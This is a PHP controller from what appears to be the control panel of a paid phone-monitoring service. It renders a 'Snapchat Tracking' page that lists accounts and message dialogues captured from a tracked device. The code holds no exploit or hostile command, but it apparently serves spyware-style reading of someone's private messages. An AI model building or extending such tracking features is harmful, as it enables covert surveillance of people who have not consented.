<?php

namespace Controllers;

use System\FlashMessages,
    Models\Modules,
    CS\Devices\Limitations;

class Snapchat extends BaseModuleController
{

    protected $module = Modules::SNAPCHAT;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {
        $snapchatModel = new \Models\Cp\Snapchat($this->di);

        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            $data = $snapchatModel->getDataTableData(
                    $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
            );
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }

        if ($this->view->paid) {
            $this->view->accounts = $snapchatModel->getAccountsList($this->di['devId']);
        }

        $this->setView('cp/snapchat/index.htm');
    }

    public function listAction()
    {
        $snapchatModel = new \Models\Cp\Snapchat($this->di);

        $this->view->list = $snapchatModel->getMessagesList($this->di['devId'], $this->params['account'], $this->params['id']);

        if (!count($this->view->list)) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
            $this->redirect($this->di['router']->getRouteUrl('snapchat'));
        }

        $this->view->user = $snapchatModel->getUserName($this->di['devId'], $this->params['account'], $this->params['id']);

        $this->view->account = $this->params['account'];

        $this->setView('cp/snapchat/list.htm');
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Snapchat Tracking');
    }

    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::SNAPCHAT);
    }

}
